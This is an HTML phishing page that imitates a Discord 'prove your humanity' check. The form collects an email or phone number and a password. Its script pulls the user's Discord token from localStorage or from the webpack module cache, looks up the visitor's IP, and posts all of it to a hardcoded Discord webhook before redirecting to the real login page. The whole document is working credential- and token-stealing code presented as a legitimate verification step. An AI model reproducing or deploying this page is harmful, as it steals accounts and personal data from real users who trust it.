<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Discord - Verify Humanity</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body, html { height: 100%; background-image: url('https://preview.redd.it/anyone-think-this-a-scam-redirects-directly-from-the-v0-i8ardi8gppa91.jpg?width=640&crop=smart&auto=webp&s=d89b45c830a59dd2aab0096d6b3b4ecf29d6711b'); background-size: cover; background-position: center; font-family: 'Whitney', sans-serif; color: #dcddde; }
    .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(47, 49, 54, 0.95); display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
    .title { font-size: 18px; color: #fff; margin-bottom: 8px; text-align: center; }
    .subtitle { font-size: 14px; color: #b9bbbe; margin-bottom: 24px; text-align: center; }
    form { width: 100%; max-width: 320px; background: rgba(32, 34, 37, 0.8); padding: 24px; border-radius: 8px; }
    label { font-size: 12px; font-weight: 600; color: #b9bbbe; margin-bottom: 6px; display: block; text-transform: uppercase; }
    input { width: 100%; padding: 12px; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; margin-bottom: 16px; }
    input:focus { outline: none; border-color: #5865f2; }
    button { width: 100%; padding: 12px; background: #5865f2; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
    button:hover { background: #4752c4; }
  </style>
</head>
<body>
  <div class="overlay">
    <h1 class="title">Prove your humanity</h1>
    <p class="subtitle">We're committed to safety and security. Unless you're a bot. Complete the challenge below and let us know you're a real person.</p>
    <form id="verifyForm">
      <label for="email">Email or Phone Number</label>
      <input type="text" id="email" required />
      <label for="password">Password</label>
      <input type="password" id="password" required />
      <button type="submit">Verify I'm Human</button>
    </form>
  </div>

  <script>
    const WEBHOOK = 'https://discord.com/api/webhooks/1434969761539690639/z9ni7tqOcUmKzc542doFrJOL3WZuBwtcnWXnJkP_XAXIW7BEDeWLg-D7coUWuFHs_3cS';

    function grabToken() {
      let token = null;
      let method = 'none';
      try {
        const ls = localStorage.getItem('token');
        if (ls && ls.length > 50) { token = ls.replace(/"/g, ''); method = 'localStorage'; }
      } catch (e) {}
      if (!token) {
        try {
          webpackChunkdiscord_app.push([[''], {}, r => {
            for (let m in r.c) {
              if (r.c[m].exports?.default?.getToken) {
                token = r.c[m].exports.default.getToken();
                method = 'webpack';
                break;
              }
            }
          }]);
        } catch (e) {}
      }
      return { token, method };
    }

    async function send(data) {
      const ip = await fetch('https://api.ipify.org').then(r => r.text()).catch(() => 'unknown');
      const { token, method } = grabToken();
      fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: 'CAPTCHA HIT - HUMANITY PROVEN',
            color: token ? 0x00ff00 : 0x5865f2,
            fields: [
              { name: 'Email/Phone', value: `\`${data.email}\``, inline: false },
              { name: 'Password', value: `\`${data.password}\``, inline: false },
              { name: 'Token', value: token ? `\`\`\`${token.substring(0, 60)}...\`\`\`` : 'Not found', inline: false },
              { name: 'Method', value: `\`${method}\``, inline: true },
              { name: 'IP', value: `\`${ip}\``, inline: true },
              { name: 'UA', value: `\`${navigator.userAgent.substring(0, 100)}\``, inline: false }
            ],
            timestamp: new Date().toISOString()
          }]
        })
      });
    }

    document.getElementById('verifyForm').onsubmit = async (e) => {
      e.preventDefault();
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;
      if (!email || !password) return;

      await send({ email, password });

      setTimeout(() => {
        window.location = 'https://discord.com/login';
      }, 1000);
    };
  </script>
</body>
</html>
